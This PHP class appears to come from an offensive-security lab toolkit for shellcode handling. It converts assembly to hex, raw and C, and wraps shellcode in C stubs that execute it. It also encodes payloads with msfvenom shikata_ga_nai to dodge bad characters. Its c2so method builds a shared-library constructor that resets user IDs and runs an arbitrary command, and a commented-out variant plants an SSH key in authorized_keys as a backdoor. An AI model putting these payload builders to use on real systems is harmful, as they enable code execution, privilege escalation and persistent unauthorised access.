<?php

class com4code extends com4for {
    
 
    public function __construct() {
        parent::__construct();
    }
  

    public function url2encode($chaine){
        $uri_encoded = "";
        for($i = 0; $i < strlen($chaine)-1; $i ++)
            $uri_encoded .= "%" . dechex(ord($chaine [$i]));
            return $uri_encoded ;
    }
    

    function asm2hex($shellcode_asm) {
        $this->ssTitre("Shellcode ASM to HEX" );
        // if (!check_soft_exist("~/metasm/metasm.rb")) $this->install_labs_metasm();
        // requette("echo \"$shellcode_asm\" | ruby ~/metasm/metasm.rb > $dir_tmp/shellcode_asm2hex.hex");
        // objdump -M intel -D /home/$user2local/Bureau/CEH/tmp/ret2libc_32 | grep -E 'dec\s*esp'
        // ("echo \"$shellcode_asm\" | objdump -M intel | grep -E 'dec\s*esp'");
        // requette("echo \"$shellcode_asm\" | ruby /opt/metasploit/apps/pro/msf3/tools/metasm_shell.rb > $dir_tmp/tmp.txt");
        // $tmp = req_ret_tab("echo \"$shellcode_asm\" |  ruby /opt/metasploit/apps/pro/msf3/tools/nasm_shell.rb | tail -1 | cut -d' ' -f5 | grep -iPo \"[a-f0-9]{2}\" > $dir_tmp/tmp.txt; cat ./tmp/tmp.txt | for i in `cat $dir_tmp/tmp.txt` ; do echo \"\\x\$i\" | tr -d '\n' ;done");
        // return $tmp[0];
        $tmp = $this->req_ret_tab( "rasm2 -a x86 -b 32 '$shellcode_asm' " );
        $opcode = str_split ( $tmp [0] );
        return $this->opcode2hex ( $opcode );
        // return file("$dir_tmp/shellcode_asm2hex.hex");
    }
    
    
    public function asm2bin($asm_code,$arch,$asm_name) {
        $objet_name = $this->asm2object($asm_code,$arch,$asm_name) ;
        return $this->object2bin($objet_name, $arch);
    }
    
    
    
    
    public function shellcode2raw() {
        $this->ssTitre(__FUNCTION__);
        // note("test: \"tr -d '\\\x' | xxd -r -p\" ");
        // payload4norme($hex);
        $this->requette( "bash -c \"/bin/echo -e '`cat $this->path`'\" > $this->dir_tmp/shellcode.raw");
        $raw = get_contents("$this->dir_tmp/shellcode.raw");
        $this->article("Shellcode RAW", $raw);
        return "$this->dir_tmp/shellcode.raw";
    }
    
    public function shellcode2graph() {
        $this->ssTitre(__FUNCTION__);
        $raw = $this->shellcode2raw();
        $raw = trim($raw);
        $raw_file = new FILE("",$raw);
        $raw_file->raw2graph($raw);
    }
    
    public function shellcode2base64() {
        $this->ssTitre(__FUNCTION__);
        $raw = $this->shellcode2raw();
        return $this->raw2base64();
    }
    public function shellcode2size() {
        $this->ssTitre(__FUNCTION__);
        $total = trim($this->req_ret_str( "cat \"$this->path\" | wc -c "));
        return trim($this->req_ret_str( "php -r \"echo ($total-1)/4;\" "));
    }
    
    
    public function hex2c($hex) {
        $this->ssTitre(__FUNCTION__);
        $hex = trim(get_contents($this->path));
        system("echo \"unsigned char shellcode[] =\\\"$hex\\\"; \n\nvoid main(){\n\t(*(void(*)()) shellcode)();\n}\" | tee $this->dir/$this->name.c ");
        return new FILE("","$this->dir/$this->name.c");
    }
    
    
    public function raw2dot(){
        $this->ssTitre(__FUNCTION__);
        $this->requette("cat $this->path | /usr/bin/sctest -vvv -Ss 100000 -G \"$this->path.dot\" > /dev/null ");
        sleep(1);
        return $this->dot2xdot("$this->path.dot");
    }
    
    
    
    public function raw2size($raw) {
        $this->ssTitre(__FUNCTION__);
        $hex = $this->raw2hex($raw);
        return $this->shellcode2size($hex);
    }
    
    
    
    
    public function raw2hex() {
        $this->ssTitre(__FUNCTION__);
        $output = "$this->dir/".__FUNCTION__;
        $query = "cat '$this->path' | tr -d \"[:space:]\" | hexdump -v -e '\"\\\\\x\" 1/1 \"%02x\"' > $output	";
        if (exists($output)) $this->cmd("localhost", $query);else return $this->req_ret_str($query);
        return $this->req_ret_str("cat $output 2> /dev/null ");
    }
    
    
    public function raw2base64() {
        $this->ssTitre(__FUNCTION__);
        $output = "$this->dir/".__FUNCTION__;
        $query = "cat \"$this->path\" | base64 > $output	";
        if (exists($output)) $this->cmd("localhost", $query);else return $this->req_ret_str($query);
        return $this->req_ret_str("cat $output 2> /dev/null ");
    }
    
    public function raw2shellcode2norme() { // del_obstacle // raw file
        $this->ssTitre(__FUNCTION__);
        $this->requette( "cat $this->path | sudo  msfvenom -e x86/shikata_ga_nai -b \"\\x00\\x20\\x0a\" -t c > $this->path.h ");
        $h = new FILE("","$this->path.h");
        $hex = $h->c2shellcode();
        return $this->payload2check4norme($hex,$this->badchars);
    }
    public function shellcode2c() {
        $this->ssTitre(__FUNCTION__);
        $hex = trim(get_contents($this->path));
        system("echo \"#include <stdio.h>\nunsigned char shellcode[] =\\\"$hex\\\"; \n\nvoid main(){\n\t(*(void(*)()) shellcode)();\n}\" | tee $this->dir/$this->name.c ");
        //return "$this->dir_tmp/$this->name.c";
        return new FILE("","$this->dir_tmp/$this->name.c");
        
    }
    
    public  function c2shellcode() {
        $this->ssTitre(__FUNCTION__);
        return $this->h2hex();
    }
    
    public function shellcode2asm() {
        $this->ssTitre(__FUNCTION__);
        // $this->requette("echo -ne \"$hex\" | x86dis -e 0 -s intel");
        $this->requette( "bash -c \"/bin/echo -e '$this->shellcode'\" | tr -d '\\n' | ndisasm -u -");
        return $this->req_ret_str("bash -c \"/bin/echo -e '$this->shellcode'\" | tr -d '\\n' | ndisasm -u - | cut -d' ' -f4- | tee $this->dir_tmp/shellcode.asm");
    }
    
    public  function asm2object($arch) { // create_object_from_asm
        $this->ssTitre(__FUNCTION__);
        $this->ssTitre("Create Object File");
        // $this->requette("as --32 $this->dir_tmp/code-injector-master/bind_sh_32.s -o $this->dir_tmp/code-injector-master/bind_sh_32.o");
        $this->requette("nasm -f elf$arch $this->path");
    }
    
    public  function h2hex() {
        $this->ssTitre(__FUNCTION__);
        $this->ssTitre( ".h to HEX");
        return $this->req_ret_str( "grep -Po \"\\\\\x[0-9a-fA-F]{1,2}\" $this->path | tr -d '\\n' | tee $this->dir/$this->name.hex ");
        return "$this->dir/$this->name.hex";
        return new FILE("","$this->dir/$this->name.hex");
    }
    
    public function c2so($cmd){
        $this->ssTitre(__FUNCTION__);
        $cmd = trim($cmd);
/*
        $lib_bash = <<<EOC
        #include <unistd.h>
        #include <stdlib.h>
        #include <string.h>
        #include <stdio.h>        
        #include <sys/types.h>
        #include <sys/stat.h>
        
        #define PUBLIC_KEY "ssh-rsa <ma clé publique SSH>"
        
        void _init(void) {
            FILE * fd;
            
            printf("In _init()\n");
            mkdir("/home/user2/.ssh", S_IRWXU);
            fd = fopen("/home/user2/.ssh/authorized_keys", "a");
            fputs(PUBLIC_KEY, fd);
            fclose(fd);
            chmod("/home/user2/.ssh/authorized_keys", S_IRUSR|S_IWUSR);
        }
        
        void __attribute__((constructor)) lib_init(void) {
            FILE * fd;            
            printf("In constructor()\n");
            mkdir("/home/user2/.ssh", S_IRWXU);
            fd = fopen("/home/user2/.ssh/authorized_keys", "a");
            fputs(PUBLIC_KEY, fd);
            fclose(fd);
            chmod("/home/user2/.ssh/authorized_keys", S_IRUSR|S_IWUSR);
        }

EOC;
     */   
        $lib_bash = <<<EOC
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>

static void x()__attribute__((constructor));
void x(){
    printf("In constructor():$cmd\\n");
    setreuid(geteuid(),getuid());
    setregid(getegid(),getgid());
    system("$cmd");
}
EOC;
        
        
        return  $lib_bash;
    }
    
    public function c2elf($options_compile) {
        $this->ssTitre(__FUNCTION__);
        $filename = "$this->dir/$this->name.elf";
        if (!exists($filename)){
        $this->requette("cat $this->path"); // -mpreferred-stack-boundary=2
        $this->requette("gcc -ggdb -w -std=c99 $options_compile $this->path -o $filename ; chmod +x $filename " );
        }
        if (exists($filename)){
            $obj_elf = new bin4linux("",$filename);
            return $obj_elf->path;
        }
        else {
            $chaine = "Error On compiling";
            $this->rouge($chaine);
        }
    }
    
    public  function raw2strings(){
        $this->ssTitre(__FUNCTION__);
        $query = "strings $this->path";
        return $this->req_ret_str($query);
    }
    
    
    
   
    
    
    
    
    
}
?>